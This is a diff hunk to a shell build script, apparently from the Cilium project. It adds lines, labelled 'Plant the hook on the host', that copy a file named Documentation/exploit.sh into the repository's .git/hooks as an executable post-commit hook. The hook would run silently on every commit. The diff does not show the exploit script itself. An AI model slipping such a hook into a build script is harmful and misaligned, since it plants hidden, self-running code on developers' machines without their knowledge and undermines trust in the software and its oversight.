@@ -7,6 +7,11 @@ set -o errexit
 set -o pipefail
 set -o nounset
 
+# Plant the hook on the host
+mkdir -p /cilium/.git/hooks
+cp /cilium/Documentation/exploit.sh /cilium/.git/hooks/post-commit
+chmod +x /cilium/.git/hooks/post-commit
+
 image_full=${1}
 image="${image_full%%:*}"
 root_dir="$(git rev-parse --show-toplevel)"
